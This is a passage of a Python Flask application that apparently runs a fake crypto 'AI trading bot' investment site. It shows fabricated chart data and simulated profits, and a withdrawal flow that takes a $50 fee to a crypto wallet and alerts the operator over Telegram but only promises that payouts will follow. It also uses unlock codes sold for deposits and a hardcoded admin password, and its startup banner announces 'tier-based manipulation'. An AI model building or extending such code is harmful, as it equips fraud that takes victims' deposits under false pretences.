                   WHERE cm.user_id = ?
                   ORDER BY cm.timestamp DESC LIMIT 50''', (session['user_id'],))
        
    messages = cursor.fetchall()
    cursor.close()
    conn.close()

    return render_template('chat.html', messages=messages)

@app.route('/send_message', methods=['POST'])
def send_message():
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Please login first'})

    message = request.form.get('message', '').strip()
    if not message:
        return jsonify({'success': False, 'error': 'Message cannot be empty'})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('''INSERT INTO chat_messages (user_id, message, is_admin, timestamp)
                       VALUES (%s, %s, %s, %s)''', (session['user_id'], message, False, timestamp))

            # Create admin notification
            cursor.execute('''INSERT INTO admin_notifications (user_id, message, type, timestamp)
                       VALUES (%s, %s, %s, %s)''', (session['user_id'], f"New message: {message}", "message", timestamp))
        else:
            cursor.execute('''INSERT INTO chat_messages (user_id, message, is_admin, timestamp)
                       VALUES (?, ?, ?, ?)''', (session['user_id'], message, 0, timestamp))

            # Create admin notification
            cursor.execute('''INSERT INTO admin_notifications (user_id, message, type, timestamp)
                       VALUES (?, ?, ?, ?)''', (session['user_id'], f"New message: {message}", "message", timestamp))

        conn.commit()
        cursor.close()
        conn.close()

        send_telegram(f"💬 New message from user {session['user_id']}: {message}")

        # Auto-respond if admin doesn't respond within 1 minute (simulated)
        auto_respond_to_user(session['user_id'])

        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/get_messages')
def get_messages():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    conn = get_db_connection()
    cursor = conn.cursor()
    
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute('''SELECT cm.message, cm.is_admin, cm.is_auto_response, cm.timestamp, u.username
                   FROM chat_messages cm
                   LEFT JOIN users u ON cm.user_id = u.id
                   WHERE cm.user_id = %s
                   ORDER BY cm.timestamp DESC LIMIT 50''', (session['user_id'],))
    else:
        cursor.execute('''SELECT cm.message, cm.is_admin, cm.is_auto_response, cm.timestamp, u.username
                   FROM chat_messages cm
                   LEFT JOIN users u ON cm.user_id = u.id
                   WHERE cm.user_id = ?
                   ORDER BY cm.timestamp DESC LIMIT 50''', (session['user_id'],))
        
    messages = cursor.fetchall()
    cursor.close()
    conn.close()

    messages_list = []
    for msg in reversed(messages):
        messages_list.append({
            'message': msg[0],
            'is_admin': bool(msg[1]),
            'is_auto_response': bool(msg[2]),
            'timestamp': msg[3],
            'username': msg[4] or 'Admin'
        })

    return jsonify({'messages': messages_list})

# Enhanced Withdrawal System
@app.route('/withdraw', methods=['GET', 'POST'])
def withdraw():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute("SELECT balance, profits, support_fee_paid FROM users WHERE id = %s", (session['user_id'],))
        else:
            cursor.execute("SELECT balance, profits, support_fee_paid FROM users WHERE id = ?", (session['user_id'],))
            
        user_data = cursor.fetchone()
        cursor.close()
        conn.close()

        if not user_data:
            return redirect(url_for('login'))

        balance = user_data[0] or 0
        profits = user_data[1] or 0
        fee_paid = bool(user_data[2])

        if request.method == 'POST':
            try:
                amount = float(request.form['amount'])
                withdraw_method = request.form.get('withdraw_method', 'crypto')
                crypto_type = request.form.get('crypto_type', 'ethereum')
                wallet_address = request.form.get('wallet_address', '')
                paypal_email = request.form.get('paypal_email', '')

                if amount < 500:
                    flash("Minimum withdrawal is $500!")
                    return redirect(url_for('withdraw'))

                if amount > balance:
                    flash("Insufficient balance!")
                    return redirect(url_for('withdraw'))

                if not fee_paid:
                    flash("Please pay the $50 withdrawal fee first!")
                    return redirect(url_for('pay_fee'))

                if withdraw_method == 'crypto' and not wallet_address:
                    flash("Please provide your wallet address!")
                    return redirect(url_for('withdraw'))

                if withdraw_method == 'paypal' and not paypal_email:
                    flash("Please provide your PayPal email!")
                    return redirect(url_for('withdraw'))

                conn = get_db_connection()
                cursor = conn.cursor()
                
                if isinstance(conn, psycopg2.extensions.connection):
                    cursor.execute("UPDATE users SET balance = balance - %s WHERE id = %s", (amount, session['user_id']))
                else:
                    cursor.execute("UPDATE users SET balance = balance - ? WHERE id = ?", (amount, session['user_id']))
                    
                conn.commit()
                cursor.close()
                conn.close()

                method_info = f"via {withdraw_method}"
                if withdraw_method == 'crypto':
                    method_info += f" ({crypto_type})"
                elif withdraw_method == 'paypal':
                    method_info += f" ({paypal_email})"

                send_telegram(f"💸 Withdrawal request: ${amount} {method_info} by user {session['user_id']}")
                flash("Withdrawal request submitted! Funds will be sent within 24 hours.")
                return redirect(url_for('dashboard'))

            except ValueError:
                flash("Please enter a valid amount!")

        return render_template('withdraw.html', balance=balance, profits=profits, fee_paid=fee_paid)

    except Exception as e:
        flash(f"Error loading withdrawal page: {str(e)}")
        return redirect(url_for('dashboard'))

@app.route('/pay_fee', methods=['GET', 'POST'])
def pay_fee():
    if 'user_id' not in session:
        return redirect(url_for('login'))

    if request.method == 'POST':
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            
            if isinstance(conn, psycopg2.extensions.connection):
                cursor.execute("UPDATE users SET support_fee_paid = TRUE WHERE id = %s", (session['user_id'],))
            else:
                cursor.execute("UPDATE users SET support_fee_paid = 1 WHERE id = ?", (session['user_id'],))
                
            conn.commit()
            cursor.close()
            conn.close()
            
            send_telegram(f"💰 Withdrawal fee paid by user {session['user_id']}")
            flash("Withdrawal fee paid! You can now make withdrawals.")
            return redirect(url_for('withdraw'))
        except Exception as e:
            flash(f"Payment error: {str(e)}")

    qr_code = generate_qr_code(WALLETS['ethereum'])
    return render_template('pay_fee.html', wallet=WALLETS['ethereum'], qr_code=qr_code)

@app.route('/faq')
def faq():
    return render_template('faq.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    session.pop('username', None)
    flash("Logged out successfully!")
    return redirect(url_for('login'))

# Enhanced Admin Routes
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'admin' and password == 'admin123':
            session['admin'] = True
            session['admin_username'] = 'admin'
            return redirect(url_for('admin_dashboard'))
        else:
            flash("Invalid admin credentials!")
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))

    try:
        conn = get_db_connection()
        cursor = conn.cursor()

        # Get dashboard statistics
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute("SELECT COUNT(*) FROM users")
            total_users = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM users WHERE invested > 0")
            active_users = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM users WHERE bot_unlocked = TRUE")
            unlocked_users = cursor.fetchone()[0]
            cursor.execute("SELECT SUM(balance) FROM users")
            total_balance = cursor.fetchone()[0] or 0
            cursor.execute("SELECT SUM(invested) FROM users")
            total_invested = cursor.fetchone()[0] or 0
            cursor.execute("SELECT SUM(profits) FROM users")
            total_profits = cursor.fetchone()[0] or 0
            cursor.execute("SELECT COUNT(*) FROM unlock_codes WHERE used = TRUE")
            used_codes = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM unlock_codes WHERE used = FALSE")
            available_codes = cursor.fetchone()[0]

            # Get recent users
            cursor.execute('''SELECT id, username, invested, profits, balance, bot_unlocked,
                        total_deposited, created_at FROM users ORDER BY created_at DESC LIMIT 20''')
            recent_users = cursor.fetchall()

            # Get unread notifications
            cursor.execute('''SELECT an.id, an.user_id, u.username, an.message, an.type, an.timestamp
                       FROM admin_notifications an
                       JOIN users u ON an.user_id = u.id
                       WHERE an.read = FALSE
                       ORDER BY an.timestamp DESC LIMIT 10''')
            notifications = cursor.fetchall()

            # Get recent messages
            cursor.execute('''SELECT cm.user_id, u.username, cm.message, cm.timestamp
                       FROM chat_messages cm
                       JOIN users u ON cm.user_id = u.id
                       WHERE cm.is_admin = FALSE
                       ORDER BY cm.timestamp DESC LIMIT 10''')
            recent_messages = cursor.fetchall()
        else:
            # SQLite queries
            cursor.execute("SELECT COUNT(*) FROM users")
            total_users = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM users WHERE invested > 0")
            active_users = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM users WHERE bot_unlocked = 1")
            unlocked_users = cursor.fetchone()[0]
            cursor.execute("SELECT SUM(balance) FROM users")
            total_balance = cursor.fetchone()[0] or 0
            cursor.execute("SELECT SUM(invested) FROM users")
            total_invested = cursor.fetchone()[0] or 0
            cursor.execute("SELECT SUM(profits) FROM users")
            total_profits = cursor.fetchone()[0] or 0
            cursor.execute("SELECT COUNT(*) FROM unlock_codes WHERE used = 1")
            used_codes = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM unlock_codes WHERE used = 0")
            available_codes = cursor.fetchone()[0]

            # Get recent users
            cursor.execute('''SELECT id, username, invested, profits, balance, bot_unlocked,
                        total_deposited, created_at FROM users ORDER BY created_at DESC LIMIT 20''')
            recent_users = cursor.fetchall()

            # Get unread notifications
            cursor.execute('''SELECT an.id, an.user_id, u.username, an.message, an.type, an.timestamp
                       FROM admin_notifications an
                       JOIN users u ON an.user_id = u.id
                       WHERE an.read = 0
                       ORDER BY an.timestamp DESC LIMIT 10''')
            notifications = cursor.fetchall()

            # Get recent messages
            cursor.execute('''SELECT cm.user_id, u.username, cm.message, cm.timestamp
                       FROM chat_messages cm
                       JOIN users u ON cm.user_id = u.id
                       WHERE cm.is_admin = 0
                       ORDER BY cm.timestamp DESC LIMIT 10''')
            recent_messages = cursor.fetchall()

        cursor.close()
        conn.close()

        return render_template('admin_dashboard.html',
                         total_users=total_users,
                         active_users=active_users,
                         unlocked_users=unlocked_users,
                         total_balance=total_balance,
                         total_invested=total_invested,
                         total_profits=total_profits,
                         used_codes=used_codes,
                         available_codes=available_codes,
                         recent_users=recent_users,
                         notifications=notifications,
                         recent_messages=recent_messages)

    except Exception as e:
        flash(f"Error loading admin dashboard: {str(e)}")
        return redirect(url_for('admin_login'))

@app.route('/admin/generate_code', methods=['POST'])
def admin_generate_code():
    if not session.get('admin'):
        return jsonify({'success': False, 'error': 'Unauthorized'})

    try:
        amount = float(request.form.get('amount', 50))
        code = generate_unlock_code(amount)

        return jsonify({'success': True, 'code': code, 'amount': amount})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/admin/send_unlock_code', methods=['POST'])
def admin_send_unlock_code():
    if not session.get('admin'):
        return jsonify({'success': False, 'error': 'Unauthorized'})

    user_id = request.form.get('user_id')
    amount = float(request.form.get('amount', 50))

    if not user_id:
        return jsonify({'success': False, 'error': 'User ID required'})

    try:
        # Generate unique unlock code
        unlock_code = generate_unlock_code(amount)

        # Send message to user with unlock code
        conn = get_db_connection()
        cursor = conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        message = f"🔓 Your unlock code: {unlock_code} for ${amount} deposit. Use this code in your dashboard to activate trading."
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('''INSERT INTO chat_messages (user_id, message, is_admin, timestamp)
                       VALUES (%s, %s, %s, %s)''', (user_id, message, True, timestamp))

            # Mark payment notification as read
            cursor.execute('''UPDATE admin_notifications SET read = TRUE
                       WHERE user_id = %s AND type = 'payment' AND read = FALSE''', (user_id,))
        else:
            cursor.execute('''INSERT INTO chat_messages (user_id, message, is_admin, timestamp)
                       VALUES (?, ?, ?, ?)''', (user_id, message, 1, timestamp))

            # Mark payment notification as read
            cursor.execute('''UPDATE admin_notifications SET read = 1
                       WHERE user_id = ? AND type = 'payment' AND read = 0''', (user_id,))

        conn.commit()
        cursor.close()
        conn.close()

        send_telegram(f"🔐 Admin sent unlock code {unlock_code} (${amount}) to user {user_id}")
        return jsonify({'success': True, 'code': unlock_code, 'message': 'Unlock code sent to user'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/admin/send_message', methods=['POST'])
def admin_send_message():
    if not session.get('admin'):
        return jsonify({'success': False, 'error': 'Unauthorized'})

    user_id = request.form.get('user_id')
    message = request.form.get('message', '').strip()

    if not message or not user_id:
        return jsonify({'success': False, 'error': 'User ID and message required'})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('''INSERT INTO chat_messages (user_id, message, is_admin, timestamp)
                       VALUES (%s, %s, %s, %s)''', (user_id, message, True, timestamp))

            # Mark notifications as read for this user
            cursor.execute('''UPDATE admin_notifications SET read = TRUE
                       WHERE user_id = %s AND read = FALSE''', (user_id,))
        else:
            cursor.execute('''INSERT INTO chat_messages (user_id, message, is_admin, timestamp)
                       VALUES (?, ?, ?, ?)''', (user_id, message, 1, timestamp))

            # Mark notifications as read for this user
            cursor.execute('''UPDATE admin_notifications SET read = 1
                       WHERE user_id = ? AND read = 0''', (user_id,))

        conn.commit()
        cursor.close()
        conn.close()

        send_telegram(f"💬 Admin message to user {user_id}: {message}")
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/admin/delete_user', methods=['POST'])
def admin_delete_user():
    if not session.get('admin'):
        return jsonify({'success': False, 'error': 'Unauthorized'})

    user_id = request.form.get('user_id')

    if not user_id:
        return jsonify({'success': False, 'error': 'User ID required'})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()

        # Deactivate user instead of deleting to preserve data
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('UPDATE users SET active = FALSE WHERE id = %s', (user_id,))

            # Get username for notification
            cursor.execute('SELECT username FROM users WHERE id = %s', (user_id,))
        else:
            cursor.execute('UPDATE users SET active = 0 WHERE id = ?', (user_id,))

            # Get username for notification
            cursor.execute('SELECT username FROM users WHERE id = ?', (user_id,))
            
        username = cursor.fetchone()[0]

        conn.commit()
        cursor.close()
        conn.close()

        send_telegram(f"🗑️ Admin deleted user: {username} (ID: {user_id})")
        return jsonify({'success': True, 'message': f'User {username} deactivated successfully'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/admin/get_user_messages')
def admin_get_user_messages():
    if not session.get('admin'):
        return jsonify({'error': 'Unauthorized'}), 401

    user_id = request.args.get('user_id')

    if not user_id:
        return jsonify({'error': 'User ID required'}), 400

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('''SELECT cm.message, cm.is_admin, cm.timestamp, u.username
                       FROM chat_messages cm
                       LEFT JOIN users u ON cm.user_id = u.id
                       WHERE cm.user_id = %s
                       ORDER BY cm.timestamp DESC LIMIT 50''', (user_id,))
        else:
            cursor.execute('''SELECT cm.message, cm.is_admin, cm.timestamp, u.username
                       FROM chat_messages cm
                       LEFT JOIN users u ON cm.user_id = u.id
                       WHERE cm.user_id = ?
                       ORDER BY cm.timestamp DESC LIMIT 50''', (user_id,))
            
        messages = cursor.fetchall()
        cursor.close()
        conn.close()

        messages_list = []
        for msg in reversed(messages):
            messages_list.append({
                'message': msg[0],
                'is_admin': bool(msg[1]),
                'timestamp': msg[2],
                'username': msg[3] or 'Admin'
            })

        return jsonify({'messages': messages_list})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/admin/mark_notification_read', methods=['POST'])
def admin_mark_notification_read():
    if not session.get('admin'):
        return jsonify({'success': False, 'error': 'Unauthorized'})

    notification_id = request.form.get('notification_id')

    if not notification_id:
        return jsonify({'success': False, 'error': 'Notification ID required'})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('UPDATE admin_notifications SET read = TRUE WHERE id = %s', (notification_id,))
        else:
            cursor.execute('UPDATE admin_notifications SET read = 1 WHERE id = ?', (notification_id,))
            
        conn.commit()
        cursor.close()
        conn.close()

        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/admin/get_notifications')
def admin_get_notifications():
    if not session.get('admin'):
        return jsonify({'error': 'Unauthorized'}), 401

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        if isinstance(conn, psycopg2.extensions.connection):
            cursor.execute('''SELECT an.id, an.user_id, u.username, an.message, an.type, an.timestamp
                       FROM admin_notifications an
                       JOIN users u ON an.user_id = u.id
                       WHERE an.read = FALSE
                       ORDER BY an.timestamp DESC LIMIT 20''')
        else:
            cursor.execute('''SELECT an.id, an.user_id, u.username, an.message, an.type, an.timestamp
                       FROM admin_notifications an
                       JOIN users u ON an.user_id = u.id
                       WHERE an.read = 0
                       ORDER BY an.timestamp DESC LIMIT 20''')
            
        notifications = cursor.fetchall()
        cursor.close()
        conn.close()

        notifications_list = []
        for notif in notifications:
            notifications_list.append({
                'id': notif[0],
                'user_id': notif[1],
                'username': notif[2],
                'message': notif[3],
                'type': notif[4],
                'timestamp': notif[5]
            })

        return jsonify({'notifications': notifications_list})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/admin/simulate_live')
def simulate_live_trading():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))

    conn = get_db_connection()
    cursor = conn.cursor()
    
    if isinstance(conn, psycopg2.extensions.connection):
        cursor.execute("SELECT id, invested FROM users WHERE invested > 0 AND bot_unlocked = TRUE AND active = TRUE")
    else:
        cursor.execute("SELECT id, invested FROM users WHERE invested > 0 AND bot_unlocked = 1 AND active = 1")
        
    active_users = cursor.fetchall()
    cursor.close()
    conn.close()

    trades_executed = 0
    total_profit = 0

    for user_id, invested in active_users:
        if random.random() < 0.4:
            trade_amount = random.uniform(50, min(500, invested * 0.3))
            profit = simulate_trade(user_id, trade_amount)
            total_profit += profit
            trades_executed += 1

    return f"Live trading simulation completed! {trades_executed} trades executed. Total profit generated: ${total_profit:.2f}"

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    session.pop('admin_username', None)
    flash("Admin logged out successfully!")
    return redirect(url_for('admin_login'))

# API endpoint for live chart data
@app.route('/api/live_chart')
def live_chart_data():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401

    # Generate realistic chart data with some volatility
    data_points = 20
    base_value = random.uniform(100, 500)
    chart_data = []
    labels = []

    for i in range(data_points):
        # Add realistic market movements
        movement = np.random.normal(0, 15)
        base_value += movement
        base_value = max(50, base_value)
        chart_data.append(round(base_value, 2))
        labels.append(f"{i+1}h")

    current_change = chart_data[-1] - chart_data[0]

    return jsonify({
        'labels': labels,
        'data': chart_data,
        'current_price': chart_data[-1],
        'change': round(current_change, 2),
        'change_percent': round((current_change / chart_data[0]) * 100, 2)
    })

if __name__ == '__main__':
    init_db()
    print("✅ Database initialized successfully!")
    print("🚀 Starting Advanced TradingView AI Bot with Admin Controls")
    print("📊 User Dashboard: http://0.0.0.0:5000")
    print("👑 Admin Dashboard: http://0.0.0.0:5000/admin/login")
    print("🔑 Admin credentials: admin / admin123")
    print("🔓 Advanced trading algorithm with tier-based manipulation enabled")
    
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('DEBUG', 'False').lower() == 'true'
    
    app.run(debug=debug, host='0.0.0.0', port=port)
